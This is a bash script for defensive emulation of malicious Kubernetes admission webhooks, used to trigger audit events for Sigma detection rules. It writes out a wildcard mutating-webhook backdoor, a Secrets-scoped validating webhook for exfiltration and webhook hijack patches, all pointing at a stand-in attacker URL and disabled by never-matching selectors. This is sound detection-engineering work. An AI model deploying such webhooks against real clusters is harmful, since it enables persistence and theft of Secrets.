#!/usr/bin/env bash
# TRR9025 — behavioral emulation for T1546 (Event Triggered Execution), Kubernetes
# malicious admission webhook creation.
#
# Procedures A-C INSTALL a harmless, throwaway admission object (a create), and
# procedure D REPOINTS harmless installed webhooks to a URL (an update or patch) and
# installs one more with a server-side apply (a patch answered 201), so the API server
# writes the admissionregistration.k8s.io audit events the paired Sigma rules key on.
# Every object is named trr9025-* so a validator matches the emulation's own events, and
# every webhook is a NO-OP: failurePolicy Ignore (A, B) or Fail (D, so that the repoint
# carries no neuter marker), a bogus unreachable off-cluster clientConfig.url (or, before
# the D repoint, a Service that does not exist), and an objectSelector that matches a
# label no object carries (D also has rules on a bogus API group), so the webhook is
# never actually invoked and cannot affect real admission. This mirrors TRR9008's safety
# convention (the inverse technique, disabling admission control). TRR9008 owns
# delete/neuter.
#
# Run ONE procedure:
#   ./emulate_k8s.sh a      create a MutatingWebhookConfiguration (off-cluster URL, wildcard rules)
#   ./emulate_k8s.sh b      create a ValidatingWebhookConfiguration (off-cluster URL, scoped to secrets)
#   ./emulate_k8s.sh c      create a CEL ValidatingAdmissionPolicy (chokepoint only)
#   ./emulate_k8s.sh d      repoint installed Service-backed webhooks to the off-cluster URL
#                           (strategic merge patch, JSON patch, PUT, server-side apply), and
#                           install one new URL-mode webhook with kubectl apply --server-side
#                           (a create that the API server performs as a PATCH answered 201; K21)
#   ./emulate_k8s.sh gap    node-local etcd bypass demonstration (read-only)
#   ./emulate_k8s.sh all    every item, in order, then clean up
#
# Prerequisites: a reachable cluster (kubectl works) with rights to write
# admissionregistration objects, and audit logging at Request level for creates and at
# Request or higher for updates and patches (the shipped policy uses RequestResponse; see
# detections/k8s/kind-apiserver-cluster.yaml). The gap test needs node access
# (docker exec on kind); set TRR9025_NODE for a non-kind lab.
set -euo pipefail

NODE="${TRR9025_NODE:-apiserver-control-plane}"
# RFC 2606 .invalid / example.com: guaranteed non-resolving, non-routable callbacks.
EVIL_URL="https://trr9025.poison.example.invalid/callback"

log() { printf '[trr9025] %s\n' "$*" >&2; }

cleanup() {
  log "cleanup: removing every trr9025- admission object"
  kubectl delete mutatingwebhookconfiguration trr9025-mwc --ignore-not-found >/dev/null 2>&1 || true
  kubectl delete validatingwebhookconfiguration trr9025-vwc --ignore-not-found >/dev/null 2>&1 || true
  kubectl delete validatingadmissionpolicy trr9025-vap --ignore-not-found >/dev/null 2>&1 || true
  kubectl delete validatingwebhookconfiguration trr9025-hijack-smp trr9025-hijack-json \
    trr9025-hijack-put trr9025-hijack-ssa trr9025-ssa-create --ignore-not-found >/dev/null 2>&1 || true
}

# Procedure A — mutating webhook backdoor. Wildcard rules + off-cluster URL. An
# objectSelector on a label no object carries means it never fires; failurePolicy
# Ignore means even that is harmless. The audit requestObject carries the rules (not
# graded) and the URL the grader keys on.
procedure_a() {
  log "A: create mutatingwebhookconfiguration trr9025-mwc (off-cluster URL, rules */*; no-op)"
  kubectl apply -f - >/dev/null 2>&1 <<EOF || true
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: trr9025-mwc
webhooks:
  - name: inject.trr9025.example.com
    admissionReviewVersions: ["v1"]
    sideEffects: None
    failurePolicy: Ignore
    clientConfig:
      url: "${EVIL_URL}"
    objectSelector:
      matchLabels:
        trr9025-never-matches: "true"
    rules:
      - operations: ["CREATE"]
        apiGroups: ["*"]
        apiVersions: ["*"]
        resources: ["*"]
        scope: "*"
EOF
}

# Procedure B — validating webhook Secret exfiltration. Scoped to secrets + off-cluster
# URL. objectSelector prevents it from ever intercepting a real Secret.
procedure_b() {
  log "B: create validatingwebhookconfiguration trr9025-vwc (off-cluster URL, resources: secrets; no-op)"
  kubectl apply -f - >/dev/null 2>&1 <<EOF || true
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: trr9025-vwc
webhooks:
  - name: collect.trr9025.example.com
    admissionReviewVersions: ["v1"]
    sideEffects: None
    failurePolicy: Ignore
    clientConfig:
      url: "${EVIL_URL}"
    objectSelector:
      matchLabels:
        trr9025-never-matches: "true"
    rules:
      - operations: ["CREATE", "UPDATE"]
        apiGroups: [""]
        apiVersions: ["v1"]
        resources: ["secrets"]
        scope: "*"
EOF
}

# Procedure C — CEL ValidatingAdmissionPolicy. In-process, cannot call off-cluster, so
# it fires the chokepoint but is not graded. Always-allow expression; no binding, so it
# does nothing even if created.
procedure_c() {
  log "C: create validatingadmissionpolicy trr9025-vap (CEL always-allow; chokepoint only)"
  kubectl apply -f - >/dev/null 2>&1 <<'EOF' || true
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: trr9025-vap
spec:
  failurePolicy: Ignore
  matchConstraints:
    resourceRules:
      - apiGroups: ["apps"]
        apiVersions: ["v1"]
        operations: ["CREATE"]
        resources: ["deployments"]
  validations:
    - expression: "true"
EOF
}

# A harmless validating webhook named $1: Service-backed, or calling clientConfig.url $2
# when $2 is set; $3 is the resourceVersion an update (PUT) must carry, because the API
# server refuses an unconditional update of a webhook configuration
# (validatingWebhookConfigurationStrategy.AllowUnconditionalUpdate() is false, v1.36.4).
# kubectl replace also fills it in when it is empty (cli-runtime Helper.Replace); the
# script sets it explicitly.
# failurePolicy Fail (so no neuter marker), rules on a bogus group that no object has,
# and an objectSelector on a label no object carries: the API server never calls it.
_hijack_vwc() {
  local cc rv=""
  if [ -n "${3:-}" ]; then rv=$'\n'"  resourceVersion: \"$3\""; fi
  if [ -n "${2:-}" ]; then
    cc="      url: \"$2\""
  else
    cc="      service: {namespace: trr9025, name: trr9025-nosvc, path: /validate, port: 443}"
  fi
  cat <<EOF
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: $1$rv
webhooks:
  - name: w.trr9025.example.com
    admissionReviewVersions: ["v1"]
    sideEffects: None
    failurePolicy: Fail
    clientConfig:
$cc
    objectSelector:
      matchLabels:
        trr9025-never-matches: "true"
    rules:
      - operations: ["CREATE"]
        apiGroups: ["trr9025.example.com"]
        apiVersions: ["v1"]
        resources: ["widgets"]
        scope: "Namespaced"
EOF
}

# Procedure D — take over an installed webhook. Each request shape runs on its own
# harmless Service-backed configuration and moves it to the off-cluster URL. The audit
# policy logs update and patch at RequestResponse, so the request body (the url) is in
# the record. All four writes are to an object that already exists, so each is answered
# 200 (a modify, not a create). The smp, json and put objects are created with a
# client-side apply, then repointed by a write that drops the Service: the strategic
# merge patch nulls service, the JSON patch removes it, and the PUT replaces the whole
# object. The ssa object is created AND repointed with `kubectl apply --server-side`
# under the one field manager (kubectl), so the apply that omits service removes it and
# leaves only the url -- a server-side apply by a different manager would leave both set
# and the API server would refuse the write (exactly one of url or service).
#
# Then, separately, a NEW url-mode webhook is installed with `kubectl apply
# --server-side`. The object does not exist, so the API server creates it with a PATCH
# answered 201 (K21): this proves the server-side-apply install path the two create
# rules match (verb patch, responseStatus.code 201), not a repoint.
procedure_d() {
  local n
  for n in smp json put; do
    _hijack_vwc "trr9025-hijack-$n" | kubectl apply -f - >/dev/null \
      || log "D: install of trr9025-hijack-$n failed (see the error above)"
  done
  _hijack_vwc trr9025-hijack-ssa | kubectl apply --server-side --force-conflicts -f - >/dev/null \
    || log "D: install of trr9025-hijack-ssa failed (see the error above)"
  log "D: strategic merge patch trr9025-hijack-smp: service -> url"
  kubectl patch validatingwebhookconfiguration trr9025-hijack-smp \
    -p "{\"webhooks\":[{\"name\":\"w.trr9025.example.com\",\"clientConfig\":{\"service\":null,\"url\":\"${EVIL_URL}\"}}]}" \
    >/dev/null || log "D: strategic merge patch refused (see the error above)"
  log "D: JSON patch trr9025-hijack-json: remove service, add url"
  kubectl patch validatingwebhookconfiguration trr9025-hijack-json --type=json \
    -p "[{\"op\":\"remove\",\"path\":\"/webhooks/0/clientConfig/service\"},{\"op\":\"add\",\"path\":\"/webhooks/0/clientConfig/url\",\"value\":\"${EVIL_URL}\"}]" \
    >/dev/null || log "D: JSON patch refused (see the error above)"
  log "D: kubectl replace (PUT) trr9025-hijack-put with url"
  local rv
  rv="$(kubectl get validatingwebhookconfiguration trr9025-hijack-put \
    -o jsonpath='{.metadata.resourceVersion}' 2>/dev/null || true)"
  _hijack_vwc trr9025-hijack-put "$EVIL_URL" "$rv" | kubectl replace -f - >/dev/null \
    || log "D: kubectl replace (PUT) refused (see the error above)"
  log "D: server-side apply trr9025-hijack-ssa with url (repoint, answered 200)"
  _hijack_vwc trr9025-hijack-ssa "$EVIL_URL" \
    | kubectl apply --server-side --force-conflicts -f - >/dev/null \
    || log "D: server-side apply repoint refused (see the error above)"
  log "D: server-side apply install of a NEW url-mode webhook trr9025-ssa-create (create via PATCH, answered 201; K21)"
  _hijack_vwc trr9025-ssa-create "$EVIL_URL" \
    | kubectl apply --server-side -f - >/dev/null \
    || log "D: server-side apply install refused (see the error above)"
}

# Gap — the control-plane bypass. An adversary with control-plane node / etcd access can
# write a webhook configuration straight into etcd, with NO API create and NO audit
# event, so the chokepoint is blind. Read-only demonstration.
procedure_gap() {
  if [ -n "${TRR9025_NODE_EXEC:-}" ]; then
    log "gap: show the etcd data path on the node (custom exec, read-only)"
    $TRR9025_NODE_EXEC 'ls -ld /var/lib/etcd 2>/dev/null || true' || true
  elif command -v docker >/dev/null 2>&1 && docker ps --format '{{.Names}}' | grep -qx "$NODE"; then
    log "gap: show the etcd data path on node $NODE (read-only)"
    docker exec "$NODE" sh -c 'ls -ld /var/lib/etcd 2>/dev/null || true' || true
  else
    log "gap: no node access (docker/TRR9025_NODE_EXEC) — skipping the etcd-bypass demonstration"
    return 0
  fi
  log "gap: a direct etcd write of a webhook config emits NO admissionregistration audit event -> node/etcd sensor only"
}

run_one() {
  case "$1" in
    a) procedure_a ;;
    b) procedure_b ;;
    c) procedure_c ;;
    d) procedure_d ;;
    gap) procedure_gap ;;
    *) log "unknown item: $1 (use a|b|c|d|gap|all)"; exit 2 ;;
  esac
}

main() {
  local which="${1:-all}"
  if [ "$which" = "all" ]; then
    for p in a b c d gap; do run_one "$p"; done
    cleanup
  else
    run_one "$which"
  fi
  log "emulation complete: $which"
}

main "$@"
